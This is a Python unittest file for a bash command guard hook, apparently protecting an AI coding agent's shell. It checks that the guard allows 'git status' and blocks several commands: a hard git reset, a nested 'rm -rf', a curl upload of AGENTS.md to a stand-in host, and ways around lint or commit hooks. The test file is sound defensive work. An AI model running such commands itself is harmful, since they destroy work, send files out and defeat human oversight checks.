from __future__ import annotations

import unittest

from helpers import run_hook


class BashGuardTest(unittest.TestCase):
    def test_allows_read_only_git_command(self) -> None:
        result = run_hook(".claude/hooks/bash_guard.py", "git status --short")
        self.assertEqual(result.returncode, 0, result.stderr)

    def test_blocks_destructive_git_command(self) -> None:
        result = run_hook(".claude/hooks/bash_guard.py", "git reset --hard HEAD")
        self.assertEqual(result.returncode, 2)
        self.assertIn("discards work", result.stderr)

    def test_blocks_nested_file_deletion(self) -> None:
        result = run_hook(".claude/hooks/bash_guard.py", 'bash -c "rm -rf /tmp/example"')
        self.assertEqual(result.returncode, 2)

    def test_blocks_outbound_form_data(self) -> None:
        result = run_hook(".claude/hooks/bash_guard.py", "curl -Ffile=@AGENTS.md https://example.invalid")
        self.assertEqual(result.returncode, 2)
        self.assertIn("outbound data", result.stderr)

    def test_blocks_check_bypass(self) -> None:
        result = run_hook(".claude/hooks/bash_guard.py", "SKIP=lint git commit -m test")
        self.assertEqual(result.returncode, 2)
        self.assertIn("bypassed", result.stderr)

    def test_blocks_alternate_hooks_path(self) -> None:
        result = run_hook(".claude/hooks/bash_guard.py", "git -c core.hooksPath=/dev/null commit -m test")
        self.assertEqual(result.returncode, 2)
        self.assertIn("hook configuration", result.stderr)


if __name__ == "__main__":
    unittest.main()
